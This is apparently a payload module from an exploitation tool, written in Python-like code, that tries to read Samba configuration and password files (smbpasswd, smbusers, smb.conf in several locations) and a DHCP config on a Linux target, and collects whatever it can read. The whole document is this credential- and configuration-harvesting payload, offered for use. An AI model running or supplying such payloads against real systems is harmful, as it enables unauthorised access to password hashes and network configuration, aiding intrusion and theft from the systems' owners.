#REQUIRE_LINUX
#This payload shows SMB configuration files
result = []
files = []

files.append('/usr/local/samba/lib/smb.conf')
files.append('/etc/smb.conf')
files.append('/etc/smbpasswd')
files.append('/etc/smbusers')
files.append('/etc/smbfstab')
files.append('/etc/samba/smb.conf')
files.append('/etc/samba/smbfstab')
files.append('/etc/samba/smbpasswd')
files.append('/usr/local/samba/private/smbpasswd')

files.append('/usr/local/etc/dhcpd.conf')



for file in files:
    if read(file) != '':
        result.append('-------------------------')
        result.append('FILE => '+file)
        result.append(read(file))

result = [p for p in result if p != '']
